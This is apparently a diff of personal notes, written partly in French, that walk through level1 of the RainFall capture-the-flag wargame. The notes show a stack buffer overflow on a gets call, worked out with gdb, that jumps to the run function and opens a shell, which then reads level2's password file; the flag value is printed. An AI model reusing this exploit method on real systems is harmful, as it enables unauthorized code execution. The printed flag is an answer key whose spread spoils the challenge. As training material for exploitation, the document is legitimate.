@@ -43,7 +43,6 @@ level1
 
 essaye plusieurs valeurs dans gets
 # 66 char
-
 level1@RainFall:~$ ./level1 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
 
@@ -63,3 +62,76 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4d
 Illegal instruction (core dumped)
 level1@RainFall:~$ 
 
+buffer overflow en jumpan sur la fnct run
+
+(gdb) info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x080482f8  _init
+0x08048340  gets
+0x08048340  gets@plt
+0x08048350  fwrite
+0x08048350  fwrite@plt
+0x08048360  system
+0x08048360  system@plt
+0x08048370  __gmon_start__
+0x08048370  __gmon_start__@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+0x08048510  __libc_csu_fini
+0x08048512  __i686.get_pc_thunk.bx
+0x08048520  __do_global_ctors_aux
+0x0804854c  _fini
+(gdb) print &run
+$1 = (<text variable, no debug info> *) 0x8048444 <run>
+
+
+
+(gdb) run < <(python -c 'print("A"*76)')
+Starting program: /home/user/level1/level1 < <(python -c 'print("A"*76)')
+
+Program received signal SIGILL, Illegal instruction.
+0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+(gdb) info registers
+eax            0xbffff6f0	-1073744144
+ecx            0xb7fd28c4	-1208145724
+edx            0xbffff6f0	-1073744144
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff740	0xbffff740
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x0	0
+eip            0xb7e45400	0xb7e45400 <__libc_start_main+32>
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) 
+
+valeur EIP 
+eip            0x41414141	0x41414141
+
+
+level1@RainFall:~$ ./level1 < /tmp/payload
+Good... Wait what?
+Segmentation fault (core dumped)
+
+pas suffisant car segfault juste apres l'ouverture du shell et donc impossible de l'utiliser
+
+
+
+level1@RainFall:~$ cat /tmp/payload - | ./level1
+;
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
